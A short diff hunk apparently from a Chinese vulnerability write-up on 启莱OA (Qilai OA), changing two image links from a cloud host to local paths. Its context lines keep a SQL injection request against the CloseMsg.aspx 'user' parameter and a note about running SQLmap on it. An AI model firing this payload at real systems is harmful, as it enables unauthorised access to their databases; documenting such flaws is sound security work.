@@ -26,8 +26,8 @@ app="启莱OA"
 http://xxx.xxx.xxx.xxx/client/CloseMsg.aspx?user=' and (select db_name())>0--&pwd=1
 ```
 
-![qilai-3-1](https://typora-1308934770.cos.ap-beijing.myqcloud.com/qilai-3-1.png)
+![qilai-3-1](./images/qilai-3-1.png)
 
 使用SQLmap对参数 user 进行注入
 
-![qilai-3-2](https://typora-1308934770.cos.ap-beijing.myqcloud.com/qilai-3-2.png)
+![qilai-3-2](./images/qilai-3-2.png)
